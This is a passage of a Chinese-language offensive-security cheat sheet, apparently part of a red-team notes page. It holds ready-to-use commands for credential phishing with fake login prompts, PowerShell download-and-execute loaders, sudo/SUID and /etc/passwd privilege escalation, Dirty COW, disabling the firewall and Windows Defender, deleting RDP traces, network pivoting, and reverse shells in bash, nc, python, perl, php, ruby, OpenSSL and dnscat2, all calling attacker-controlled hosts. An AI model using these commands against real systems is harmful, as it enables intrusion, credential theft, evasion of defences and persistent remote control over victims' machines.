strike</h4><pre><code>beacon&gt; steal_token 1234 窃取令牌beacon&gt; rev2self 恢复令牌Windowshttps://gitee.com/RichChigga/incognito2</code></pre><h3 id="密码窃取"><a href="#密码窃取" class="headerlink" title="密码窃取"></a>密码窃取</h3><h4 id="伪造锁屏"><a href="#伪造锁屏" class="headerlink" title="伪造锁屏"></a>伪造锁屏</h4><pre><code>https://github.com/Pickfordmatt/SharpLocker/releases</code></pre><p><img src="./img/144.png" alt="image"></p><pre><code>https://github.com/bitsadmin/fakelogonscreen/releases</code></pre><p><img src="./img/145.png" alt="image"></p><pre><code>记录的密码保存在%LOCALAPPDATA%\Microsoft\user.db</code></pre><p><img src="./img/146.png" alt="image"></p><h4 id="伪造认证框"><a href="#伪造认证框" class="headerlink" title="伪造认证框"></a>伪造认证框</h4><h5 id="CredsLeaker"><a href="#CredsLeaker" class="headerlink" title="CredsLeaker"></a>CredsLeaker</h5><pre><code>https://github.com/Dviros/CredsLeaker将cl_reader.php，config.php，config.cl上传到web服务器修改CredsLeaker.ps1、run.bat中URL参数</code></pre><p><img src="./img/147.png" alt="image"></p><pre><code>输入正确密码后会自动结束，否则除非结束powershell进程才可结束获取到正确密码后会在目录下生成creds.txt保存密码信息</code></pre><p><img src="./img/148.png" alt="image"></p><h5 id="LoginPrompt"><a href="#LoginPrompt" class="headerlink" title="LoginPrompt"></a>LoginPrompt</h5><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-LoginPrompt.ps1&#39;);invoke-LoginPrompt&quot;</code></pre><p><img src="./img/149.png" alt="image"></p><pre><code>除非结束进程，否则只能输对密码才能关闭对话框。收到正确密码会返回结果</code></pre><p><img src="./img/150.png" alt="image"></p><h5 id="Nishang-Invoke-CredentialsPhish"><a href="#Nishang-Invoke-CredentialsPhish" class="headerlink" title="Nishang-Invoke-CredentialsPhish"></a>Nishang-Invoke-CredentialsPhish</h5><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.108/ps/nishang/Gather/Invoke-CredentialsPhish.ps1&#39;); Invoke-CredentialsPhish&quot;</code></pre><p><img src="./img/151.png" alt="image"><br><img src="./img/152.png" alt="image"></p><h3 id="RottenPotato"><a href="#RottenPotato" class="headerlink" title="RottenPotato"></a>RottenPotato</h3><pre><code>https://github.com/foxglovesec/RottenPotato Meterpreter&gt;use incognitoMeterpreter&gt;list_tokens -uMeterpreter&gt;upload /root/Desktop/rottenpotato.exeMeterpreter&gt;execute -HC -f rottenpotato.exeMeterpreter&gt;impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</code></pre><h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><pre><code>检测有漏洞的服务&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1&#39;);Invoke-AllChecks&quot;</code></pre><p><img src="./img/153.png" alt="image"></p><pre><code>&gt;icacls C:\Windows\system32\\wlbsctrl.dll 查看文件权限，F为完全控制，M修改</code></pre><p><img src="./img/154.png" alt="image"></p><pre><code>在AbuseFunction中会显示利用语句。&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1&#39;); Write-HijackDll -OutputFile &#39;C:\Windows\system32\\wlbsctrl.dll&#39; -Command &#39;net user admin pass@Qwe1 /add&amp;net localgroup administrators admin /add&#39;&quot;</code></pre><p><img src="./img/155.png" alt="image"></p><pre><code>重启电脑后会新增用户admin</code></pre><p><img src="./img/156.png" alt="image"></p><pre><code>查找可能劫持的进程&gt;Find-ProcessDLLHijack查找环境变量中当前用户可修改的目录&gt;Find-PathDLLHijack查找存在注册表中自动登录用户的平局&gt;Get-RegistryAutoLogon查询trusted_service_path&gt;Get-ServiceUnquoted查询当前用户可修改的注册表开机启动项&gt;Get-ModifiableRegistryAutoRun查询当前用户可修改的计划任务项&gt;Get-ModifiableScheduledTaskFile查询系统中所有web.config文件中的明文密码&gt;Get-WebConfig</code></pre><h3 id="Powerup-AlwaysInstallElevated"><a href="#Powerup-AlwaysInstallElevated" class="headerlink" title="Powerup-AlwaysInstallElevated"></a>Powerup-AlwaysInstallElevated</h3><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1&#39;);Get-RegAlwaysInstallElevated&quot;</code></pre><p><img src="./img/157.png" alt="image"></p><pre><code>&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1&#39;); Write-UserAddMSI&quot;普通用户执行安装</code></pre><p><img src="./img/158.png" alt="image"><br><img src="./img/159.png" alt="image"></p><h3 id="AlwaysInstallElevated提权"><a href="#AlwaysInstallElevated提权" class="headerlink" title="AlwaysInstallElevated提权"></a>AlwaysInstallElevated提权</h3><pre><code>&gt;reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated&gt;reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated为1 检测是否永远以高权限启动安装#HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer新建DWORD32 DisableMSI=0#msfvenom -p windows/adduser USER=msi PASS=pass@123 -f msi -o /root/add.msi#upload /root/add.msi c:\\1.msi&gt;msiexec /quiet /qn /i c:\1.msiMSF#use exploit/windows/local/always_install_elevated#set session 1</code></pre><h3 id="Trusted-Service-Paths"><a href="#Trusted-Service-Paths" class="headerlink" title="Trusted Service Paths"></a>Trusted Service Paths</h3><pre><code>&gt;wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot; 列出没有用引    号包含的服务#use exploit/windows/local/trusted_service_path#set session 1</code></pre><h3 id="Vulnerable-Services"><a href="#Vulnerable-Services" class="headerlink" title="Vulnerable Services"></a>Vulnerable Services</h3><pre><code>#use exploit/windows/local/service_permissions#set session 1</code></pre><h3 id="Sudo提权"><a href="#Sudo提权" class="headerlink" title="Sudo提权"></a>Sudo提权</h3><pre><code>/home/user/.sudo_as_admin_successful&gt;sudo zip /tmp/test.zip /tmp/test -T --unzip-command=&quot;sh -c /bin/bash&quot;&gt;sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash&gt;sudo strace –o /dev/null /bin/bash&gt;sudo nmap –interactive nmap&gt;!sh&gt;echo &quot;os.execute(&#39;/bin.sh&#39;)&quot;&gt;/tmp/1.nse&gt;sudo nmap –script=/tmp/shell.nse &gt;sudo more/less/man /etc/rsyslog.conf&gt;sudo git help status &gt;!/bin/bash&gt;sudo ftp&gt;!/bin/bash&gt;sudo vim -c &#39;!sh&#39;&gt;sudo find /bin/ -name ls -exec /bin/bash ;&gt;sudo awk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;</code></pre><h3 id="Linux计划任务"><a href="#Linux计划任务" class="headerlink" title="Linux计划任务"></a>Linux计划任务</h3><pre><code>&gt;for user in $(getent passwd|cut -f1 -d:); do echo &quot;### Crontabs for $user ####&quot;; crontab -u $user -l; done 列举所有用户的crontab$cat /etc/crontab$echo &#39;echo &quot;ignite ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers&#39; &gt;test.sh$echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;$echo &quot;&quot; &gt; --checkpoint=1或编辑可写的计划任务文件#!/usr/bin/pythonimport os,subprocess,sockets=socket.socekt(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;192.168.0.107&quot;,&quot;5555&quot;))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</code></pre><h3 id="Linux-SUID提权"><a href="#Linux-SUID提权" class="headerlink" title="Linux SUID提权"></a>Linux SUID提权</h3><pre><code>查找有root权限的SUID文件$find / -perm -u=s -type f 2&gt;/dev/null$find / -user root -perm -4000 -print 2&gt;/dev/null$find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</code></pre><h4 id="Find"><a href="#Find" class="headerlink" title="Find"></a>Find</h4><pre><code>$touch xxx$/usr/bin/find xxx –exec whoami \;$/usr/bin/find xxx –exec python -c &#39;import     socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.2&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;  \;&amp;&gt;find xxx -exec netcat -lvp 12138 -e /bin/sh \; 然后攻击机主动连接</code></pre><h4 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h4><pre><code># 进入nmap的交互模式&gt;nmap --interactive &gt;!sh</code></pre><h4 id="VIM"><a href="#VIM" class="headerlink" title="VIM"></a>VIM</h4><pre><code>&gt;vim.tiny /etc/shadow&amp;&gt;vim.tiny# 按ESC:set shell=/bin/sh:shell</code></pre><h4 id="BASH"><a href="#BASH" class="headerlink" title="BASH"></a>BASH</h4><pre><code>&gt;bash –p</code></pre><p>####More/Less/Man<br>    &gt;less /etc/passwd<br>    !/bin/sh<br>    &gt;more /etc/passwd<br>    !/bin/bash<br>    &gt;man passwd<br>    !/bin/bash</p><h4 id="CP-MV"><a href="#CP-MV" class="headerlink" title="CP/MV"></a>CP/MV</h4><pre><code>覆盖shadow文件</code></pre><h3 id="Linux-etc-passwd提权"><a href="#Linux-etc-passwd提权" class="headerlink" title="Linux /etc/passwd提权"></a>Linux /etc/passwd提权</h3><pre><code>$ls –lh /etc/passwd 若是任何用户可读写$perl -le &#39;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#39; 生成密码$echo &quot;test:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd一条命令添加root用户#useradd -p `openssl passwd -1 -salt &#39;user&#39; 123qwe` -u 0 -o -g root  -G root -s /bin/bash -d /home/user venus用户名venus 密码123qwe#useradd newuser;echo &quot;newuser:password&quot;|chpasswd&gt;echo &quot;admin:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd&gt;passwd admin修改密码</code></pre><h3 id="Linux脏牛提权"><a href="#Linux脏牛提权" class="headerlink" title="Linux脏牛提权"></a>Linux脏牛提权</h3><pre><code>https://github.com/FireFart/dirtycow$gcc -pthread dirty.c -o dirty –lcrypt$./dirty passwd 生成账户密码https://github.com/gbonacini/CVE-2016-5195$make$./dcow -s</code></pre><h2 id="RDP-amp-Fireawall"><a href="#RDP-amp-Fireawall" class="headerlink" title="RDP&amp;Fireawall"></a>RDP&amp;Fireawall</h2><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><pre><code>Hydra爆破RDP&gt;hydra -l admin -P /root/Desktop/passwords -S 192.168.0.0 rdp&amp;Nlbrute</code></pre><p><img src="./img/160.png" alt="image"></p><h3 id="注册表开启"><a href="#注册表开启" class="headerlink" title="注册表开启"></a>注册表开启</h3><pre><code>查询系统是否允许3389远程连接：&gt;REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections1表示关闭，0表示开启查看远程连接的端口：&gt;REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber本机开启3389远程连接的方法通过cmd&gt;REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&gt;REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f通过reg文件内容如下：Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&quot;fDenyTSConnections&quot;=dword:00000000[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&quot;PortNumber&quot;=dword:00000d3d导入注册表：regedit /s a.reg</code></pre><h3 id="NETSH启动服务"><a href="#NETSH启动服务" class="headerlink" title="NETSH启动服务"></a>NETSH启动服务</h3><pre><code>&gt;netsh firewall set service remoteadmin enable &gt;netsh firewall set service remotedesktop enable&gt;netsh firewall set opmode disable 关闭防火墙</code></pre><h3 id="注入点开启"><a href="#注入点开启" class="headerlink" title="注入点开启"></a>注入点开启</h3><pre><code>.asp?id=100;exec master.dbo.xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SYSTEM\CurrentControlSet\Control\Terminal Server&#39;,&#39;fDenyTSConnections&#39;,&#39;REG_DWORD&#39;,0;--注：修改连接端口重启后生效</code></pre><h3 id="MSF开启"><a href="#MSF开启" class="headerlink" title="MSF开启"></a>MSF开启</h3><pre><code>#run post/windows/manage/enable_rdp</code></pre><h3 id="Wmic开启"><a href="#Wmic开启" class="headerlink" title="Wmic开启"></a>Wmic开启</h3><pre><code>&gt;wmic /node:192.168.1.2 /USER:administrator PATH win32_terminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 1</code></pre><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><pre><code>允许进站如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许3389端口，命令如下:&gt;netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow&gt;netsh firewall set portopening TCP 3389 ENABLE防火墙关闭&gt;netsh firewall set opmode mode=disable&gt;netsh advfirewall show allprofiles查看状态&gt;netsh advfirewall set allprofiles state off &gt;sc stop windefend&gt;sc delete windefendPS&gt; Set-MpPreference -DisableRealtimeMonitoring 1PS&gt; Set-MpPreference -Disablearchivescanning $true</code></pre><h3 id="多用户登录"><a href="#多用户登录" class="headerlink" title="多用户登录"></a>多用户登录</h3><pre><code>Mimikatz设置允许多用户登录&gt;privilege::debug&gt;ts::multirdprdpwraphttps://github.com/stascorp/rdpwrap&gt;RDPWInst.exe -i is</code></pre><h3 id="RDP连接记录"><a href="#RDP连接记录" class="headerlink" title="RDP连接记录"></a>RDP连接记录</h3><pre><code>https://github.com/3gstudent/List-RDP-Connections-History查看本机用户连接RDP的记录</code></pre><p><img src="./img/161.png" alt="image"></p><pre><code>&gt;Psloggedon.exe username</code></pre><p><img src="./img/162.png" alt="image"></p><h3 id="删除痕迹"><a href="#删除痕迹" class="headerlink" title="删除痕迹"></a>删除痕迹</h3><pre><code>@echo off@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /va /f@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; /a@exit</code></pre><h2 id="端口映射-amp-转发"><a href="#端口映射-amp-转发" class="headerlink" title="端口映射&amp;转发"></a>端口映射&amp;转发</h2><h3 id="MSF-3"><a href="#MSF-3" class="headerlink" title="MSF"></a>MSF</h3><pre><code>使用条件：服务器通外网，拥有自己的公网ip&gt;portfwd add -l 5555 -p 3389 -r 172.16.86.153转发目标主机的3389远程桌面服务端口到本地的5555&gt;portfwd list</code></pre><h3 id="lcx-exe"><a href="#lcx-exe" class="headerlink" title="lcx.exe"></a>lcx.exe</h3><pre><code>使用条件：服务器通外网，拥有自己的公网ip靶机：lcx.exe -slave 外网IP 9999 127.0.0.1 3389linux攻击机：./portmap -m 2 -p1 9999 -p2 33889windows攻击机：lcx -listen 9999 33889 把本机9999监听的信息转到33889PortTranhttps://github.com/k8gege/K8tools/raw/master/PortTran.rar攻击机执行&gt;PortTranS20.exe 12345 389</code></pre><p><img src="./img/163.png" alt="image"></p><pre><code>靶机执行&gt;PortTranC20.exe 127.0.0.1 3389 192.168.0.102 12345建立连接后，攻击机连接本机389端口即可</code></pre><p><img src="./img/164.png" alt="image"></p><h3 id="SSH-1"><a href="#SSH-1" class="headerlink" title="SSH"></a>SSH</h3><pre><code>-C 压缩传输，加快传输速度-f 在后台对用户名密码进行认证-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行-q 安静模式，不要显示任何debug信息-l 指定ssh登录名-g 允许远程主机连接到本地用于转发的端口-L 进行本地端口转发-R 进行远程端口转发-D 动态转发，即socks代理-T 禁止分配伪终端-p 指定远程ssh服务端口</code></pre><h4 id="正向转发"><a href="#正向转发" class="headerlink" title="正向转发"></a>正向转发</h4><pre><code>外网靶机110内网靶机115本地攻击机编辑后restart ssh服务#vim /etc/ssh/sshd_confAllowTcpForwarding yes 允许TCP转发GatewayPorts yes   允许远程主机连接本地转发的端口TCPKeepAlive yes    TCP会话保持存活PasswordAuthentication yes  密码认证&gt;ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22本地攻击机执行，本地33890转发到远程的3389端口上线MSF攻击机出网Linux靶机--不出网Linux靶机--不出网win机&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=不出网Linux机 lport=12138 -f exe -o /var/www/html/1.exe攻击机监听端口12345不出网Linux机&gt;ssh -C -f -N -g -L 0.0.0.0:12138:攻击机:12345 root@出网Linux主机 -p 22</code></pre><h4 id="反向转发"><a href="#反向转发" class="headerlink" title="反向转发"></a>反向转发</h4><pre><code>外网攻击107内网靶机97出网靶机编辑后restart ssh服务#vim /etc/ssh/sshd_confAllowTcpForwarding yes 允许TCP转发GatewayPorts yes   允许远程主机连接本地转发的端口TCPKeepAlive yes    TCP会话保持存活PasswordAuthentication yes  密码认证&gt;ssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22出网靶机执行，把外部攻击机33890转发到内部隔离网络的3389&gt;netstat –tnlp</code></pre><p><img src="./img/165.png" alt="image"></p><pre><code>转发成功，外网攻击机安装apt install rinetd(正向tcp转发工具)&gt;vim /etc/rinetd.conf添加0.0.0.0 3389 127.0.0.1 33890&gt;service rinetd start</code></pre><p><img src="./img/166.png" alt="image"></p><pre><code>看到107是kali攻击机，连接107:33890即可到达内网10.1.1.97的桌面</code></pre><p><img src="./img/167.png" alt="image"></p><h3 id="Invoke-SocksProxy"><a href="#Invoke-SocksProxy" class="headerlink" title="Invoke-SocksProxy"></a>Invoke-SocksProxy</h3><pre><code>https://gitee.com/RichChigga/Invoke-SocksProxy&gt;Import-Module .\Invoke-SocksProxy.psm1 &gt;Invoke-SocksProxy -bindPort 12138 建立socks代理，使用代理软件连接</code></pre><p><img src="./img/168.png" alt="image"><br><img src="./img/169.png" alt="image"></p><h3 id="SSF"><a href="#SSF" class="headerlink" title="SSF"></a>SSF</h3><h4 id="单层网络正向转发"><a href="#单层网络正向转发" class="headerlink" title="单层网络正向转发"></a>单层网络正向转发</h4><pre><code>https://github.com/securesocketfunneling/ssf/releases内网机执行：&gt;ssfd.exe -p 1080</code></pre><p><img src="./img/170.png" alt="image"></p><pre><code>边界机器执行&gt;ssf.exe -L 12138:10.1.1.108:22 -p 1080 192.168.0.98 把内网10.1.1.108的SSH转发出来</code></pre><p><img src="./img/171.png" alt="image"></p><pre><code>边界机器访问内网端口</code></pre><p><img src="./img/172.png" alt="image">    </p><h4 id="单层网络反向转发"><a href="#单层网络反向转发" class="headerlink" title="单层网络反向转发"></a>单层网络反向转发</h4><pre><code>边界机器执行：&gt;ssfd.exe -p 1080</code></pre><p><img src="./img/173.png" alt="image">    </p><pre><code>内网机器执行：&gt;ssf.exe -R 12138:10.1.1.108:22 -p 1080 192.168.0.106</code></pre><p><img src="./img/174.png" alt="image"><br><img src="./img/175.png" alt="image"></p><h3 id="Netsh"><a href="#Netsh" class="headerlink" title="Netsh"></a>Netsh</h3><pre><code>边界机器执行：&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=2222 connectaddress=10.1.1.108 connectport=22将内网10.1.1.108主机22端口转发至本机2222端口，攻击机连接边界机器2222端口即可访问内网SSH</code></pre><p><img src="./img/176.png" alt="image"></p><pre><code>&gt;netsh interface portproxy add v4tov4 listenaddress=192.168.0.98 listenport=13389 connectaddress=192.168.0.98 connectport=3389当靶机某服务只允许内网访问时，将端口转发出来</code></pre><p><img src="./img/177.png" alt="image"></p><pre><code>添加防火墙规则：&gt;netsh advfirewall firewall add rule name=&quot;RDP&quot; protocol=TCP dir=in localip=192.168.0.98 localport=13389 action=allow列出所有转发规则:&gt;netsh interface portproxy show all</code></pre><p><img src="./img/178.png" alt="image"></p><pre><code>删除指定的端口转发规则：&gt;netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=192.168.0.98删除所有转发规则：&gt;netsh interface portproxy reset</code></pre><h3 id="Iptables"><a href="#Iptables" class="headerlink" title="Iptables"></a>Iptables</h3><pre><code>需开启ip转发功能&gt;vim /etc/sysctl.conf设置net.ipv4.ip_forward=1</code></pre><p><img src="./img/179.png" alt="image"><br><img src="./img/180.png" alt="image"></p><pre><code>本地端口22转发到2222上&gt;iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-ports 22内网98机器3389转到本机110的6789上&gt;iptables -t nat -A PREROUTING -d 192.168.0.110 -p tcp --dport 6789 -j DNAT --to-destination 192.168.0.98:3389&gt;iptables -t nat -A POSTROUTING -d 192.168.0.98 -p tcp --dport 3389 -j SNAT --to 192.168.0.110</code></pre><p><img src="./img/181.png" alt="image"></p><pre><code>查看规则&gt;iptables -t nat -L删除规则&gt;iptables -t nat -D PREROUTING 1删除全部规则&gt;iptables -t nat –F</code></pre><h3 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h3><pre><code>https://github.com/jpillora/chisel攻击机执行&gt;chisel server -p 12138 –reverse</code></pre><p><img src="./img/182.png" alt="image"></p><pre><code>靶机执行&gt;chisel client 公网攻击机IP:12138 R:1234:127.0.0.1:3389</code></pre><p><img src="./img/183.png" alt="image"></p><pre><code>建立成功后，攻击机连接本机1234端口即可访问靶机3389</code></pre><p><img src="./img/184.png" alt="image"></p><h2 id="命令-amp-控制"><a href="#命令-amp-控制" class="headerlink" title="命令&amp;控制"></a>命令&amp;控制</h2><h3 id="Interactive-shell"><a href="#Interactive-shell" class="headerlink" title="Interactive shell"></a>Interactive shell</h3><pre><code>&gt;python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;&gt;expect -c &#39;spawn bash;interact&#39;</code></pre><h3 id="Script-reverse-shell"><a href="#Script-reverse-shell" class="headerlink" title="Script reverse shell"></a>Script reverse shell</h3><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><pre><code>&gt;/bin/bash -i &gt; /dev/tcp/attackerip/4444 0&lt;&amp;1 2&gt;&amp;1</code></pre><p><img src="./img/185.png" alt="image"></p><pre><code>&gt;bash -i &gt;&amp; /dev/tcp/attackerip/4444 0&gt;&amp;1</code></pre><p><img src="./img/186.png" alt="image"></p><pre><code>&gt;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></pre><p><img src="./img/187.png" alt="image"></p><pre><code>&gt;msfvenom -p cmd/unix/reverse_bash LHOST=attackerip LPORT=4444 -o shell.sh</code></pre><p><img src="./img/188.png" alt="image"></p><h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><pre><code>&gt;nc -e /bin/sh attackerip 4444&gt;nc -Lp 31337 -vv -e cmd.exe&amp;&gt;mknod backpipe p; nc 192.168.0.107 12138 0&lt;backpipe | /bin/bash 1&gt;backpipe&gt;nc 192.168.0.10 31337</code></pre><h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><pre><code>&gt;mknod backpipe p; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</code></pre><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><pre><code>#php -r &#39;$sock=fsockopen(&quot;IP&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.0.107/1234 0&gt;&amp;1&#39;&quot;);?&gt;</code></pre><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><pre><code>&gt;python -c &#39; import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;IP&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]); &#39;&gt;msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py&gt;import socket,struct,time for x in range(10): try: s=socket.socket(2,socket.SOCK_STREAM) s.connect((&#39;IP&#39;,端口)) break except: time.sleep(5) l=struct.unpack(&#39;&gt;I&#39;,s.recv(4))[0] d=s.recv(l) while len(d)</code></pre><h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><pre><code>&gt;perl -e &#39;use Socket;$i=&quot; attackerip &quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;&gt;perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;&gt;perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;  #####windows</code></pre><h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><pre><code>&gt;ruby -rsocket -e&#39;f=TCPSocket.open(&quot;attackerip &quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;&gt;ruby -rsocket -e &#39;c=TCPSocket.new(&quot;attackerip&quot;,&quot;4444&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;   #####windows</code></pre><h3 id="OpenSSL-encrypt-shell"><a href="#OpenSSL-encrypt-shell" class="headerlink" title="OpenSSL encrypt shell"></a>OpenSSL encrypt shell</h3><pre><code>生成证书&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre><p><img src="./img/189.png" alt="image"></p><h4 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h4><pre><code>监听&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 1337</code></pre><p><img src="./img/190.png" alt="image"></p><pre><code>靶机执行&gt;mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.0.108:1337 &gt; /tmp/s; rm /tmp/s</code></pre><p><img src="./img/191.png" alt="image"></p><pre><code>此方式使用TLS1.2 协议对通信进行加密</code></pre><h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><pre><code>攻击机需监听2个端口，一个端口发送命令，一个端口接收回显发送&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 1337接收&gt;openssl s_server -quiet -key key.pem -cert cert.pem -port 1338靶机执行&gt;openssl s_client -quiet -connect 192.168.0.108:1337|cmd.exe|openssl s_client -quiet -connect 192.168.0.108:1338</code></pre><p><img src="./img/192.png" alt="image"><br><img src="./img/193.png" alt="image"><br><img src="./img/194.png" alt="image"></p><h3 id="Dnscat2"><a href="#Dnscat2" class="headerlink" title="Dnscat2"></a>Dnscat2</h3><pre><code>安装dnscat2&gt;apt-get -y install ruby-dev git make g++&gt;gem install bundler&gt;git clone https://github.com/iagox86/dnscat2.git&gt;cd dnscat2/server&gt;bundle install执行&gt;ruby dnscat2.rb abc.com -e open --no-cache</code></pre><p><img src="./img/195.png" alt="image"></p><h4 id="Powercat"><a href="#Powercat" class="headerlink" title="Powercat"></a>Powercat</h4><pre><code>靶机执行&gt;powercat -c 192.168.0.108 -v -dns abc.com -e cmd.exe</code></pre><p><img src="./img/196.png" alt="image"></p><pre><code>dnscat2执行&gt;session -i 1进入会话</code></pre><p><img src="./img/197.png" alt="image"></p><h4 id="Dnscat2-exe"><a href="#Dnscat2-exe" class="headerlink" title="Dnscat2 exe"></a>Dnscat2 exe</h4><pre><code>Linuxhttps://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-x86.tar.bz2 https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-x64.tar.bz2https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip攻击机执行&gt;ruby dnscat2.rb --dns &quot;domain=zone.com,host=192.168.0.108&quot; --no-cache靶机执行&gt;dnscat2-v0.07-client-win32.exe --dns server=192.168.0.108</code></pre><p><img src="./img/198.png" alt="image"></p><pre><code>攻击机执行&gt;session -i [ID]进入会话</code></pre><p><img 